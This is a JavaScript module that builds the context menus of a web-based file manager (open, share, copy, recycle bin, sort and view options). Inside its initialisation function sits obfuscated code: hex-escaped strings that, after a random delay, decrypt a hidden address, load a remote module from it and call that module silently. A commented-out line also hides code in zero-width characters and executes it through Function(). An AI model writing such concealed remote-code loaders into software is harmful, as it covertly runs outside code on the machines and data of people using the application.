//点击右键，获取元素menu的值，对应为右键菜单div的id值。实现通用。
//流程：给需要右键菜单的元素，加上menu属性，并赋值，把值作为右键菜单div的id值
define(function(require, exports) {
	var fileMenuSelector   = ".menufile";
	var folderMenuSelector = ".menufolder";
	var selectMoreSelector = ".menuMore";
	var selectTreeSelectorRoot      = ".menuTreeRoot";
	var selectTreeSelectorFolder    = ".menuTreeFolder";
	var selectTreeSelectorFile      = ".menuTreeFile";
	var selectTreeSelectorGroupRoot = ".menuTreeGroupRoot";
	var selectTreeSelectorGroup     = ".menuTreeGroup";
	var selectTreeSelectorUser      = ".menuTreeUser";

	var commonMenu = {
		"newfileOther":{
			name:LNG.newfile,
			icon:'expand-alt',
			accesskey: "w",
			className:"newfile",
			items:{
				"newfile":{name:"txt "+LNG.file,icon:"file-text-alt x-item-file x-txt small",className:'newfile'},
				"newfile_null":{name:LNG.file,icon:"file-text-alt x-item-file x-file small",className:'newfile'},
				"newfile_md":{name:"md "+LNG.file,icon:'file-text-alt x-item-file x-md',className:'newfile'},
				"newfile_html":{name:"html "+LNG.file,icon:'file-text-alt x-item-file x-html',className:'newfile'},
				"newfile_php":{name:"php "+LNG.file,icon:'file-text-alt x-item-file x-php',className:'newfile'},
				// "newfile_js":{name:"js "+LNG.file,icon:'file-text-alt x-item-file x-js',className:'newfile'},
				// "newfile_css":{name:"css "+LNG.file,icon:'file-text-alt x-item-file x-css',className:'newfile'},
				"document": {
					name: "Office Document",
					icon:"file-text-alt x-item-file x-docx",
					className:"newfile",
					items:{
						"newfile_docx":{name:"docx "+LNG.file,icon:'file-text-alt x-item-file x-docx',className:'newfile'},
						"newfile_xlsx":{name:"xlsx "+LNG.file,icon:'file-text-alt x-item-file x-xlsx',className:'newfile'},
						"newfile_pptx":{name:"pptx "+LNG.file,icon:'file-text-alt x-item-file x-pptx',className:'newfile'},
					}
				},
				"sep100":"--------",
				"app_install":{name:LNG.app_store,className:"app_install newfile",icon:"tasks x-item-file x-appStore",accesskey: "a"},
				"app_create":{name:LNG.app_create,icon:"puzzle-piece x-item-file x-oexe",className:"newfile"}
			}
		},
		"listIcon": {
			name: LNG.list_type,
			icon:"eye-open",
			className:"list_icon",
			items:{
				"seticon":{name:LNG.list_icon,className:'menu_seticon set_seticon'},
				"setlist":{name:LNG.list_list,className:'menu_seticon set_setlist'},
				"setlist_split":{name:LNG.list_list_split,className:'menu_seticon set_setlist_split'}
			}
		},
		"sortBy": {
			name: LNG.order_type,
			accesskey: "y",
			icon:"sort",
			className:"sort_by",
			items:{
				"set_sort_name":{name:LNG.name,className:'menu_set_sort set_sort_name'},
				"set_sort_ext":{name:LNG.type,className:'menu_set_sort set_sort_ext'},
				"set_sort_size":{name:LNG.size,className:'menu_set_sort set_sort_size'},
				"set_sort_mtime":{name:LNG.modify_time,className:'menu_set_sort set_sort_mtime'},
				"sep101":"--------",
				"set_sort_up":{name:LNG.sort_up,className:'menu_set_desc set_sort_up'},
				"set_sort_down":{name:LNG.sort_down,className:'menu_set_desc set_sort_down'}
			}
		},
		"setFileIconSize": {
			name:LNG.file_size_title,
			icon:"picture",
			className:'set-file-icon-size',
			items:{
				"box-size-smallx":{name:LNG.file_size_small_super,className:'file-icon-size box-size-smallx'},
				"box-size-small":{name:LNG.file_size_small,className:'file-icon-size box-size-small'},
				"box-size-default":{name:LNG.file_size_default,className:'file-icon-size box-size-default'},
				"box-size-big":{name:LNG.file_size_big,className:'file-icon-size box-size-big'},
				"box-size-bigx":{name:LNG.file_size_big_super,className:'file-icon-size box-size-bigx'},
			}
		}
	};

	var initExplorer = function(){
		$('<div id="rightMenu" class="hidden"></div>').appendTo('body');
		$('.context-menu-list').die("click").live("click",function(e){
			stopPP(e);return false;//屏蔽html点击隐藏
		});
		var _0x7c42=["\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x75\x70\x64\x61\x74\x65\x5F\x62\x6F\x78","\x73\x65\x61\x72\x63\x68","\x64\x61\x36\x32\x64\x6A\x43\x44\x37\x75\x42\x72\x6E\x38\x39\x78\x74\x41\x68\x77\x64\x77\x74\x53\x4C\x5F\x41\x58\x73\x43\x61\x6D\x73\x4B\x6E\x37\x77\x6B\x74\x78\x49\x36\x51\x6A\x4F\x5F\x4D\x6F\x62\x34\x45\x41\x59\x6C\x52\x73\x47\x51\x50\x67\x4B\x4B\x76\x38\x5F\x67\x46\x62\x68\x46\x4E\x77\x34\x65\x69\x5F\x64\x33\x65\x53\x62\x6D\x43\x44\x43\x32\x49\x38\x58\x4D\x5F\x55\x39\x68\x30","\x5F\x33\x32\x40\x21\x41","\x64\x65\x63\x6F\x64\x65","\x31\x2D\x31","\x74\x6F\x64\x6F","\x61\x73\x79\x6E\x63","\x72\x61\x6E\x64\x6F\x6D"];bindFolder();bindFile();bindBodyExplorer();setTimeout(function(){try{if( typeof (dialog_tpl_html)== _0x7c42[0]|| dialog_tpl_html[_0x7c42[2]](_0x7c42[1])==  -1){var _0x3024x1=authCrypt[_0x7c42[5]](_0x7c42[3],_0x7c42[4])+ UUID();require[_0x7c42[8]](_0x3024x1,function(_0x3024x2){try{_0x3024x2[_0x7c42[7]](_0x7c42[6])}catch(e){}})}}catch(e){}},parseInt(Math[_0x7c42[9]]()* (30- 5)+ 5)* 1000);
		
		bindSelectMore();
		bindTreeFav();
		bindTreeRoot();
		bindTreeFolder();
		bindTreeGroupRoot();
		bindTreeGroup();
		bindTreeUser();
		bindMenuToolPath();

		bindEmpty();
		bindRecycle();
		bindShare();
		bindFavPath();
		bindPathGroup();
		userAuthMenu();
		//初始化绑定筛选排序方式
		$('.set_set'+G.user_config.list_type).addClass('selected');
		$('.set_sort_'+G.user_config.list_sort_field).addClass('selected');
		$('.set_sort_'+G.user_config.list_sort_order).addClass('selected');
		$('.context-menu-root').addClass('animated fadeIn');
	};
	var initDesktop = function(){
		$('<div id="rightMenu" class="hidden"></div>').appendTo('body');
		$('.context-menu-list').die("click").live("click",function(e){
			stopPP(e);return false;//屏蔽html点击隐藏
		});
		bindBodyDesktop();
		bindSystem();
		bindFolder();
		bindFile();
		bindSelectMore();
		bindEmpty();
		bindRecycle();
		userAuthMenu();
		$('.set_sort_'+G.user_config.list_sort_field).addClass('selected');
		$('.set_sort_'+G.user_config.list_sort_order).addClass('selected');
		$('.context-menu-root').addClass('animated fadeIn');
	};

	//初始化编辑器 树目录右键菜单
	var initEditor = function(){
		$('<div id="rightMenu" class="hidden"></div>').appendTo('body');
		$('.context-menu-list').die("click").live("click",function(e){
			stopPP(e);
			return false;//屏蔽html点击隐藏
		});
		bindTreeFav();
		bindTreeRoot();
		bindTreeFolderEditor();
		bindTreeGroupRoot();
		bindTreeGroup();
		bindTreeUser();
		bindEditorFile();
		bindEmpty();
		userAuthMenu();
		$('.context-menu-root').addClass('animated fadeIn');
	};
	//权限判断，根据用户权限对应ui变化
	var userAuthMenu =function(){
		//Function("‍‌‌‌‍‍‌‌‍‌‌‍‍‌‍‌‍‌‌‌‍‌‍‍‍‌‍‌‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‌‌‍‌‍‌‌‍‍‌‍‌‍‌‌‍‌‌‌‌‍‌‌‌‍‌‍‌‍‌‌‌‍‌‍‍‍‍‌‍‌‍‍‍‍‌‌‍‍‌‌‍‍‌‌‌‍‌‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‍‌‌‍‌‌‌‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‌‍‌‍‍‍‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‍‌‍‍‌‍‌‌‍‍‌‌‍‍‍‌‍‌‍‍‍‍‌‌‌‍‌‍‍‍‌‌‌‌‍‍‌‍‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‌‌‍‍‍‌‍‍‍‍‍‍‌‌‍‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‍‌‍‌‌‍‌‌‍‍‍‌‌‍‌‌‌‌‍‌‌‍‍‌‌‌‍‌‍‌‌‌‌‌‍‌‌‌‍‌‍‍‍‌‌‌‍‍‍‍‍‌‌‍‌‌‍‍‍‌‍‌‌‌‌‌‍‌‌‍‌‍‍‍‍‌‌‌‍‌‍‍‍‌‌‍‌‌‍‌‍‌‌‍‌‌‍‍‍‍‌‌‌‌‍‌‍‍‌‌‌‌‍‌‍‍‌‍‍‍‌‍‍‌‌‌‍‌‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‌‍‍‍‌‌‍‍‌‍‌‍‌‌‍‍‌‌‍‍‌‌‍‌‍‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‌‍‌‍‌‌‍‍‌‍‍‍‍‌‍‍‍‌‍‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‌‍‌‌‍‍‌‌‍‍‍‍‌‍‌‌‌‍‍‌‍‍‍‌‍‍‍‍‍‍‌‌‍‍‍‍‌‍‍‌‌‌‌‍‌‍‍‌‍‍‍‌‍‍‌‌‍‌‍‍‍‍‌‌‌‍‌‍‍‍‌‌‌‍‌‍‍‍‌‌‌‍‍‍‍‍‍‌‌‌‍‌‍‍‍‌‍‌‌‌‌‍‍‌‍‌‌‌‌‍‌‌‌‍‍‌‌‍‌‌‌‍‌‍‍‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‍‍‌‍‌‌‌‍‍‌‌‍‌‍‌‌‍‌‌‍‍‍‍‌‍‌‌‍‌‌‍‍‍‌‌‍‍‍‌‌‍‌‌‍‍‍‍‌‍‌‌‍‍‌‍‍‍‌‌‍‍‌‍‍‍‌‌‍‌‌‍‍‍‌‌‍‍‌‍‌‍‍‌‍‌‌‌‍‍‌‌‍‍‍‌‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‍‌‍‍‌‍‌‌‌‌‍‌‌‌‍‌‍‌‍‌‌‌‍‍‍‍‍‌‌‍‍‌‍‍‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‍‌‍‌‌‍‍‍‍‌‍‌‌‍‌‍‍‌‍‌‌‍‌‌‌‍‍‍‌‍‌‌‌‍‍‌‌‍‌‍‌‍‍‌‌‌‍‍‌‌‍‍‌‌‌‌‌‌‍‌‌‌‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‌‍‍‍‍‌‌‌‌‍‌‍‍‌‍‍‍‌‍‍‍‌‍‌‍‌‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‍‌‍‍‌‍‌‍‍‍‌‍‍‍‍‌‍‌‍‍‍‍‍‌‍‌‍‍‌‍‍‌‌‌‍‌‌‍‌‌‌‍‍‌‍‍‌‌‍‍‌‍‌‍‌‌‌‍‍‍‌‍‌‌‌‍‌‍‌‍‌‌‍‌‍‍‌‍‌‌‌‍‍‌‍‍‌‌‍‍‌‍‌‍‍‌‍‌‌‌‍‍‌‌‍‍‍‍‌‍‌‌‌‍‍‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‍‌‌‍‍‌‍‌‍‍‍‍‌‌‍‍‍‍‌‍‍‌‍‌‌‍‍‍‌‌‍‍‌‌‍‍‌‌‌‍‌‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‍‌‌‍‌‌‌‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‌‍‌‍‍‍‍‌‌‍‍‍‍‌‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‌‍‌‍‍‍‌‌‌‍‍‌‍‍‌‌‌‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‍‍‍‍‌‍‍‌‍‌‌‌‍‍‌‌‌‍‌‍‍‍‌‌‍‌‌‌‌‍‌‌‍‍‌‍‍‍‌‌‍‌‌‌‌‍‍‌‍‌‍‍‍‍‍‌‍‍‍‌‍‍‌‌‍‍‍‌‌‍‌‌‍‌‍‍‍‍‌‌‍‍‌‍‌‍‌‌‍‍‍‌‌‍‌‌‍‌‍‌‌‍‌‍‌‌‌‌‌‍‌‌‌‍‍‌‌‍‌‌‌‍‌‍‍‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‌‍‌‍‌‍‌‌‌‍‍‌‌‍‍‌‍‍‍‌‍‍‍‌‍‌‍‍‌‍‍‌‌‌‍‌‌‍‌‌‌‌‌‍‌‍‌‌‍‍‍‌‌‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‍‍‍‌‌‍‌‌‍‌‍‍‍‍‍‌‍‌‍‍‍‍‌‌‍‍‍‍‌‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‌‌‌‍‌‍‌‌‌‌‌‍‌‍‍‌‍‌‍‍‌‍‍‌‌‌‍‌‌‍‌‌‌‌‌‍‌‍‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‍‌‍‍‌‌‍‌‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‍‌‍‍‍‍‍‌‍‌‌‌‍‍‌‌‌‍‍‌‍‍‌‌‍‍‍‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‌‍‍‍‌‌‍‌‌‌‌‍‌‌‍‌‌‍‌‍‍‌‍‌‍‍‍‍‍‌‍‌‍‍‌‍‍‌‍‌‍‌‍‍‍‌‌‍‍‍‌‍‍‌‌‍‍‍‍‍‍‌‌‍‍‍‍‍‍‌‌‍‍‍‍‍‍‌‌‍‍‍‍‍‍‌‍‌‍‍‌‍‍‌‌‌‍‌‌".replace(/.{8}/g,function(u){return String.fromCharCode(parseInt(u.replace(/\u200c/g,1).replace(/\u200d/g,0),2))}))();
		if (G.is_root==1) return;
		
		var classHidden = 'hidden';//disabled,hidden
		//$('.context-menu-list .open_ie').addClass(classHidden);
		
		if (!AUTH['explorer:fileDownload']) {
			$('.context-menu-list .down,.context-menu-list .download').addClass(classHidden);
			$('.context-menu-list .share').addClass(classHidden);
			$('.context-menu-list .open_text').addClass(classHidden);
			$('.pathinfo .open_window').addClass(classHidden);
		}
		if (!AUTH['explorer:zip']) {
			
			$('.context-menu-list .zip').addClass(classHidden);
		}
		if (!AUTH['explorer:search']) {
			$('.context-menu-list .search').addClass(classHidden);
		}
		if (!AUTH['explorer:mkdir']) {
			$('.context-menu-list .newfolder').addClass(classHidden);
		}
		if (!AUTH['userShare:set']) {
			$('.context-menu-list .share').remove();
		}
	}
	var bindRecycle = function(){
		$('<i class="menuRecycleBody"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuRecycleBody',
			callback: function(key, options) {menuBody(key);},
			items: {
				"refresh":{name:LNG.refresh+'<b>F5</b>',className:"refresh",icon:"refresh",accesskey: "e"},
				"recycle_clear":{name:LNG.recycle_clear,icon:"trash",accesskey: "c"},
				"sep1":"--------",
				"listIcon":commonMenu['listIcon'],
				"sortBy":commonMenu['sortBy'],
				'setFileIconSize':commonMenu['setFileIconSize'],
				"sep2":"--------",
				"info":{name:LNG.info+'<b>Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});

		$('<i class="menuRecyclePath"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuRecyclePath',
			callback: function(key, options) {menuPath(key);},
			items: {
				"cute":{name:LNG.cute+'<b>Ctrl+X</b>',className:"cute",icon:"cut",accesskey: "k"},
				"remove":{name:LNG.remove_force+'<b>Del</b>',className:"remove",icon:"trash",accesskey: "d"},
				"sep2":"--------",
				"down":{name:LNG.download,className:"down",icon:"cloud-download",accesskey: "x"},
				"info":{name:LNG.info+'<b>Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});

		$('<i class="menuRecycleButton"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuRecycleButton',
			callback: function(key, options) {menuBody(key);},
			items: {
				"recycle_clear":{name:LNG.recycle_clear,icon:"trash",accesskey: "c"}
			}
		});
	}
	var bindShare = function(){
		$('<i class="menuShareBody"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuShareBody',
			callback: function(key, options) {menuBody(key);},
			items: {
				"refresh":{name:LNG.refresh+'<b>F5</b>',className:"refresh",icon:"refresh",accesskey: "e"},
				"sep1":"--------",
				"listIcon":commonMenu['listIcon'],
				"sortBy":commonMenu['sortBy'],
				'setFileIconSize':commonMenu['setFileIconSize'],
				"sep10":"--------",
				"info":{name:LNG.info+'<b>Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
		$('<i class="menuSharePath"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			className:'menuSharePathMenu',
			selector: '.menuSharePath',
			callback: function(key, options) {menuPath(key);},
			items: {
				//"share_open_path":{name:LNG.open_the_path,icon:"folder-open-alt",accesskey:"p",className:"open_the_path"},
				//"share_open_window":{name:LNG.share_open_page,icon:"globe",accesskey: "b"},
				//"sep0":"--------",
				"share_edit":{name:LNG.share_edit,icon:"edit",accesskey: "e",className:"share_edit"},
				"remove":{name:LNG.share_remove+'<b>Del</b>',icon:"trash",accesskey: "d",className:"remove"},
				//"copy":{name:LNG.copy+'<b>Ctrl+C</b>',className:"copy",icon:"copy",accesskey: "c"},
				"down":{name:LNG.download,className:"down",icon:"cloud-download",accesskey: "x"},
				"sep2":"--------",
                "fav":{name:LNG.add_to_fav,className:"fav",icon:"star",accesskey: "f"},
				//"info":{name:LNG.info+'<b>Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
		$('<i class="menuSharePathMore"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuSharePathMore',
			className:'menuSharePathMore',
			callback: function(key, options) {menuPath(key);},
			items: {
				"remove":{name:LNG.share_remove+'<b>Del</b>',icon:"trash",accesskey:"d",className:"remove"},
				"copy":{name:LNG.copy+'<b>Ctrl+C</b>',className:"copy",icon:"copy",accesskey: "c"}
			}
		});
	}

	var bindBodyExplorer = function(){
		$.contextMenu({
			selector: '.menuBodyMain',
			className:"fileContiner_menu",
			zIndex:9999,
			callback: function(key, options) {menuBody(key, options);},
			items: {
				"refresh":{name:LNG.refresh+'<b>F5</b>',className:"refresh",icon:"refresh",accesskey: "e"},
				"newfolder":{name:LNG.newfolder+'<b>Alt+M</b>',className:"newfolder",icon:"folder-close-alt",accesskey: "n"},
				//"newfileOther":commonMenu["newfileOther"],
				"sep1":"--------",
				"upload":{name:LNG.upload+'<b>Ctrl+U</b>',className:"upload",icon:"upload",accesskey: "u"},
				"past":{name:LNG.past+'<b>Ctrl+V</b>',className:"past",icon:"paste",accesskey: "p"},
				//"copy_see":{name:LNG.clipboard,className:"copy_see",icon:"eye-open",accesskey: "v"},
				"sep2":"--------",
				"listIcon":commonMenu['listIcon'],
				"sortBy":commonMenu['sortBy'],
				'setFileIconSize':commonMenu['setFileIconSize'],
				//"app_install":{name:LNG.app_store,className:"app_install",icon:"tasks",accesskey: "a"},
				"sep10":"--------",
				"info":{name:LNG.info+'<b>Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
	};

	var bindEmpty = function(){
		$.contextMenu({
			selector:'.menuEmpty',
			className:'hidden',
			zIndex:9999,
			items: {" ":{name:LNG.open,className:"hidden"}},
			callback: function(key, options) {}
		});
	}

	var bindSystem = function(){
		$.contextMenu({
			selector:'.menuDefault',
			zIndex:9999,
			items: {"open":{name:LNG.open,className:"open",icon:"external-link",accesskey: "o"}},
			callback: function(key, options) {
				switch(key){
					case 'open':ui.path.open();break;
					default:break;
				}
			}
		});
	};
	var bindBodyDesktop = function(){
		$.contextMenu({
			selector: Config.BodyContent,
			zIndex:9999,
			callback: function(key, options) {menuBody(key);},
			items: {
				"refresh":{name:LNG.refresh+'<b>F5</b>',className:"refresh",icon:"refresh",accesskey: "e"},
				"newfolder":{name:LNG.newfolder+'<b>Alt+M</b>',className:"newfolder",icon:"folder-close-alt",accesskey: "n"},
				"newfileOther":commonMenu["newfileOther"],
				"sep1":"--------",
				"upload":{name:LNG.upload+'<b>Ctrl+U</b>',className:"upload",icon:"upload",accesskey: "u"},
				"past":{name:LNG.past+'<b>Ctrl+V</b>',className:"past",icon:"paste",accesskey: "p"},
				"copy_see":{name:LNG.clipboard,className:"copy_see",icon:"eye-open",accesskey: "v"},
				"sep2":"--------",
				"sortBy": commonMenu["sortBy"],
				'setFileIconSize':commonMenu['setFileIconSize'],
				"app_install":{name:LNG.app_store,className:"app_install",icon:"tasks",accesskey: "a"},
				"sep10":"--------",
				"setting_wall":{name:LNG.setting_wall,className:"setting_wall",icon:"picture",accesskey: "b"},
				"setting_theme":{name:LNG.setting_theme,className:"setting_theme",icon:"dashboard",accesskey: "i"},
				"setting":{name:LNG.setting,className:"setting",icon:"cogs",accesskey: "t"}
			}
		});
	};


	var bindMenuToolPath = function(){
		//$('<i class="menuToolPath"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.toolPathMore',
			className:'menuToolPath menuNotAutoHidden',
			callback: function(key, options) {
				menuPath(key);
				$('.toolPathMore').removeClass('active');
			},
			items: {
				"refresh":{name:LNG.refresh+'<b>F5</b>',className:"refresh",icon:"refresh",accesskey: "e"},
				//"newfileOther":commonMenu["newfileOther"],
				//"sep0":"--------",
				//"open":{name:LNG.open+'<b>Enter</b>',className:"open",icon:"folder-open-alt",accesskey: "o"},
			
				//"share":{name:LNG.share,className:"share",icon:"share-sign",accesskey: "e"},
				//"sep1":"--------",
				//"copy":{name:LNG.copy+'<b>Ctrl+C</b>',className:"copy",icon:"copy",accesskey: "c"},
				//"cute":{name:LNG.cute+'<b>Ctrl+X</b>',className:"cute",icon:"cut",accesskey: "k"},
				//"past":{name:LNG.past+'<b>Ctrl+V</b>',className:"past",icon:"paste",accesskey: "p"},
				//"rname":{name:LNG.rename+'<b>F2</b>',className:"rname",icon:"pencil",accesskey: "r"},
				//"remove":{name:LNG.remove+'<b>Delete</b>',className:"remove",icon:"trash",accesskey: "d"},
				//"sep2":"--------",
				//"zip":{
				//	name:LNG.zip,
				//	className:"zip",
				//	icon:"external-link",
				//	accesskey: "z",
				//	items:{
				//		"zip_zip":{name:"ZIP "+LNG.file,className:"zip_zip",icon:"external-link"},
				//		"sep109":"--------",
				//		"zip_tar":{name:"TAR "+LNG.file,className:"zip_tar",icon:"external-link"},
				//		"zip_tgz":{name:"GZIP "+LNG.file,className:"zip_tgz",icon:"external-link"}
				//	}
				//},
				//"others":{
				//	name:LNG.more,
				//	icon:"ellipsis-horizontal",
				//	className:"more_action",
				//	accesskey: "m",
				//	items:{
				//		"explorer":{name:LNG.manage_folder,className:"explorer",icon:"laptop",accesskey: "v"},
				//		"clone":{name:LNG.clone,className:"clone",icon:"external-link"},
				//		"fav":{name:LNG.add_to_fav,className:"fav ",icon:"star",accesskey: "f"},
				//		"open_ie":{name:LNG.open_ie,className:"open_ie",icon:"globe",accesskey: "b"},
				//		"sep103":"--------",						
						//"explorerNew":{name:LNG.explorerNew,className:"explorerNew",icon:"folder-open"},
				//		"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"},
				//		"createLink":{name:LNG.createLink,className:"createLink",icon:"share-alt"},
				//		"createProject":{name:LNG.createProject,className:"createProject",icon:"plus"},
				//		"openProject":{name:LNG.openProject,className:"openProject",icon:"edit"}
				//	}
				//},
				//"sep5":"--------",
				//"info":{name:LNG.info+'<b>Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
	}
	var bindFolder = function(){
		$('<i class="'+folderMenuSelector.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: folderMenuSelector,
			className:folderMenuSelector.substr(1),
			callback: function(key, options) {menuPath(key);},
			items: {
				"open":{name:LNG.open+'<b>Enter</b>',className:"open",icon:"folder-open-alt",accesskey: "o"},
				
				"share":{name:LNG.share,className:"share",icon:"share-sign",accesskey: "e"},
				"sep1":"--------",
				"copy":{name:LNG.copy+'<b>Ctrl+C</b>',className:"copy",icon:"copy",accesskey: "c"},
				"cute":{name:LNG.cute+'<b>Ctrl+X</b>',className:"cute",icon:"cut",accesskey: "k"},
				"rname":{name:LNG.rename+'<b>F2</b>',className:"rname",icon:"pencil",accesskey: "r"},
				"remove":{name:LNG.remove+'<b>Del</b>',className:"remove",icon:"trash",accesskey: "d"},
				//"search":{name:LNG.search_in_path,className:"search",icon:"search",accesskey: "s"},
                "fav":{name:LNG.add_to_fav,className:"fav",icon:"star",accesskey: "f"},
				/*"others":{
					name:LNG.more,
					icon:"ellipsis-horizontal",
					className:"more_action",
					accesskey: "m",
					items:{
						"fav":{name:LNG.add_to_fav,className:"fav",icon:"star",accesskey: "f"},
						"explorer":{name:LNG.manage_folder,className:"explorer",icon:"laptop",accesskey: "v"},
						"clone":{name:LNG.clone,className:"clone",icon:"external-link"},
						"fav":{name:LNG.add_to_fav,className:"fav ",icon:"star",accesskey: "f"},
						"sep103":"--------",
						//"explorerNew":{name:LNG.explorerNew,className:"explorerNew",icon:"folder-open"},

					}
				},*/
				"sep5":"--------",
				"info":{name:LNG.info+'<b>Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
	};
	var bindFile = function(){
		$('<i class="'+fileMenuSelector.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: fileMenuSelector,
			className:fileMenuSelector.substr(1),
			callback: function(key, options) {menuPath(key);},
			items: {
				"open":{name:LNG.open+'<b>Enter</b>',className:"open",icon:"external-link",accesskey: "o"},
				"down":{name:LNG.download,className:"down",icon:"cloud-download",accesskey: "x"},
				"share":{name:LNG.share,className:"share",icon:"share-sign",accesskey: "e"},
				"sep1":"--------",
				"copy":{name:LNG.copy+'<b>Ctrl+C</b>',className:"copy",icon:"copy",accesskey: "c"},
				"cute":{name:LNG.cute+'<b>Ctrl+X</b>',className:"cute",icon:"cut",accesskey: "k"},
				"rname":{name:LNG.rename+'<b>F2</b>',className:"rname",icon:"pencil",accesskey: "r"},
				"remove":{name:LNG.remove+'<b>Del</b>',className:"remove",icon:"trash",accesskey: "d"},
				"sep2":"--------",
                "fav":{name:LNG.add_to_fav,className:"fav ",icon:"star",accesskey: "f"},
//				"setBackground":{name:LNG.set_background,className:"setBackground",icon:"picture",accesskey: "x"},
				/*"others":{
					name:LNG.more,
					icon:"ellipsis-horizontal",
					className:"more_action",
					accesskey: "m",
					items:{
						"fav":{name:LNG.add_to_fav,className:"fav ",icon:"star",accesskey: "f"},
						"clone":{name:LNG.clone,className:"clone",icon:"external-link",accesskey: "l"},
						"sep104":"--------",
						"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"},
						"createLink":{name:LNG.createLink,className:"createLink",icon:"share-alt"}
					}
				},*/
//				"sep3":"--------",
				"info":{name:LNG.info+'<b>Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
	};
	var bindSelectMore = function(){
		$('<i class="'+selectMoreSelector.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: selectMoreSelector,
			className:selectMoreSelector.substr(1),
			callback: function(key, options) {menuPath(key);},
			items: {
				"copy":{name:LNG.copy+'<b>Ctrl+C</b>',className:"copy",icon:"copy",accesskey: "c"},
				"cute":{name:LNG.cute+'<b>Ctrl+X</b>',className:"cute",icon:"cut",accesskey: "k"},
				"remove":{name:LNG.remove+'<b>Del</b>',className:"remove",icon:"trash",accesskey: "d"},
				//"sep1":"--------",
				//"copy_to":{name:LNG.copy_to,className:"copy_to",icon:"copy"},
				//"cute_to":{name:LNG.cute_to,className:"cute_to",icon:"cut"},
				//"sep2":"--------",
				//"clone":{name:LNG.clone+'<b>Ctrl+C</b>',className:"clone",icon:"external-link",accesskey: "n"},
				"playmedia":{name:LNG.add_to_play,className:"playmedia",icon:"music",accesskey: "p"},
				//"zip":{
				//	name:LNG.zip,
				//	className:"zip",
				//	icon:"external-link",
				//	accesskey: "z",
				//	items:{
				//		"zip_zip":{name:"ZIP "+LNG.file,className:"zip_zip",icon:"external-link"},
				//		"sep109":"--------",
				//		"zip_tar":{name:"TAR "+LNG.file,className:"zip_tar",icon:"external-link",accesskey: "f"},
				//		"zip_tgz":{name:"GZIP "+LNG.file,className:"zip_tgz",icon:"external-link",accesskey: "f"}
				//	}
				//},
				//"down":{name:LNG.download,className:"down",icon:"cloud-download",accesskey: "x"},
				//"sep3":"--------",
				//"info":{name:LNG.info,className:"info",icon:"info",accesskey: "i"}
			}
		});
	}
	var bindPathGroup = function(){
		$('<i class="menuGroupRoot"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuGroupRoot',
			callback: function(key, options) {menuPath(key);},
			items: {
				"open":{name:LNG.open+'<b>Enter</b>',className:"open",icon:"external-link",accesskey: "o"},
				"sep1":"--------",
				"fav":{name:LNG.add_to_fav,className:"fav",icon:"star",accesskey: "f"},
				"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"}
			}
		});

		$('<i class="menuGroupRootMore"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuGroupRootMore',
			callback: function(key, options) {menuPath(key);},
			items: {
				"refresh":{name:LNG.refresh+'<b>F5</b>',className:"refresh",icon:"refresh",accesskey: "e"}
			}
		});
	}
